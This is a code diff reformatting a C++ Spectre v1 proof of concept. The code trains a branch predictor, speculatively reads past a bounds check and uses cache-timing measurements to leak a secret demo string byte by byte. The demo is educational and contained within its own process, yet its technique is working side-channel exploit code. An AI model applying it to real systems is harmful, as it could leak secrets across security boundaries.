@@ -14,8 +14,6 @@
  * limitations under the License.
  */
 
-#include "instr.h"
-
 #include <algorithm>
 #include <array>
 #include <cstring>
@@ -23,6 +21,8 @@
 #include <string>
 #include <tuple>
 #include <vector>
+
+#include "instr.h"
 
 // Objective: given some control over accesses to the *non-secret* string
 // "Hello, world!", construct a program that obtains "It's a s3kr3t!!!" without
@@ -94,7 +94,7 @@ static char leak_byte(const char *data, size_t offset) {
   // The first and last value might be adjacent to other elements on the heap,
   // so we only use the other elements, which are guaranteed to be on different
   // cache lines, and even different pages, than any other value.
-  BigByte* isolated_oracle = &oracle_array[1];
+  BigByte *isolated_oracle = &oracle_array[1];
 
   // The size needs to be unloaded from cache to force speculative execution
   // to guess the result of comparison.
@@ -136,14 +136,14 @@ static char leak_byte(const char *data, size_t offset) {
       // We need to avoid branching even for unoptimized compilation (-O0).
       // Optimized compilations (-O1, concretely -fif-conversion) would remove
       // the branching automatically.
-      size_t local_offset = offset + (
-          safe_offset - offset) * (bool)((i + 1) % 2048);
+      size_t local_offset =
+          offset + (safe_offset - offset) * (bool)((i + 1) % 2048);
 
       if (local_offset < *size_in_heap) {
         // This branch was trained to always be taken during speculative
         // execution, so it's taken even on the tenth iteration, when the
         // condition is false!
-        ForceRead(&isolated_oracle[(size_t) (data[local_offset])]);
+        ForceRead(&isolated_oracle[(size_t)(data[local_offset])]);
       }
     }
 
@@ -162,7 +162,8 @@ static char leak_byte(const char *data, size_t offset) {
       // accessing the offsets in a pseudo-random order.
       size_t mixed_i = ((i * 167) + 13) & 0xFF;
       void *timing_entry = &isolated_oracle[mixed_i];
-      sorted_latencies[mixed_i] = latencies[mixed_i] = ReadLatency(timing_entry);
+      sorted_latencies[mixed_i] = latencies[mixed_i] =
+          ReadLatency(timing_entry);
     }
 
     std::sort(sorted_latencies.begin(), sorted_latencies.end());
@@ -175,7 +176,8 @@ static char leak_byte(const char *data, size_t offset) {
     int hitcount = 0;
     for (size_t i = 0; i < 256; ++i) {
       if (latencies[i] < median_latency - hitmiss_diff / 2 &&
-          i != (size_t) (data[safe_offset])) ++hitcount;
+          i != (size_t)(data[safe_offset]))
+        ++hitcount;
     }
 
     // If there is not exactly one hit, we consider that sample invalid and
@@ -183,17 +185,17 @@ static char leak_byte(const char *data, size_t offset) {
     if (hitcount == 1) {
       for (size_t i = 0; i < 256; ++i) {
         if (latencies[i] < median_latency - hitmiss_diff / 2 &&
-            i != (size_t) (data[safe_offset])) ++scores[i];
+            i != (size_t)(data[safe_offset]))
+          ++scores[i];
       }
     }
 
     std::tie(best_val, runner_up_val) = top_two_indices(scores);
 
-    // TODO(jeanpierreda): This timing algorithm is suspect (it is measuring whether
-    // something is usually faster than average, rather than usually faster, or
-    // faster on average.)
-    if (scores[best_val] > (2 * scores[runner_up_val] + 40))
-      break;
+    // TODO(jeanpierreda): This timing algorithm is suspect (it is measuring
+    // whether something is usually faster than average, rather than usually
+    // faster, or faster on average.)
+    if (scores[best_val] > (2 * scores[runner_up_val] + 40)) break;
     // Otherwise: if we still don't know with high confidence, we can keep
     // accumulating timing data until we think we know the value.
     if (run > 100000) {
@@ -204,10 +206,10 @@ static char leak_byte(const char *data, size_t offset) {
     }
   }
   delete size_in_heap;
-  return (char) best_val;
+  return (char)best_val;
 }
 
-int main(int argc, char** argv) {
+int main(int argc, char **argv) {
   std::cout << "Leaking the string: ";
   std::cout.flush();
   const size_t private_offset = private_data - public_data;
